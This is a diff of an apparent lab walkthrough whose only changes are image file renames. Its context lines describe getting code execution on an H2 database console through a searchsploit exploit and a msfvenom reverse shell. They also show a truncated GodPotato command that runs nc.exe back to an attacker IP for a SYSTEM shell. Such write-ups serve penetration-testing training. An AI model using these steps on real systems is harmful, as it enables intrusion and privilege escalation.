@@ -57,7 +57,7 @@ The H2 Database does have a few code execution exploits that might work.&#x20;
 
 Port 8082 shows us the login to the H2 database.
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
 We can just click 'Connect', and login successfully.
 
@@ -76,7 +76,7 @@ H2 Database 1.4.199 - JNI Code Execution                   | java/local/49384.tx
 
 To exploit this, we would need to just copy and paste the script contents of the `searchsploit` file twice, and we would get RCE:
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (3).png" alt=""><figcaption></figcaption></figure>
 
 To get a reverse shell, simply use these 2 commands with a `msfvenom` generated payload.
 
@@ -203,6 +203,6 @@ C:\Windows\Tasks>.\godpotato.exe -cmd "cmd /c C:/Windows/Tasks/nc.exe 192.168.45
 [*] process start with pid 1592
 ```
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (5).png" alt=""><figcaption></figcaption></figure>
 
 This is a SYSTEM shell, and we can grab the required flags. Rooted!
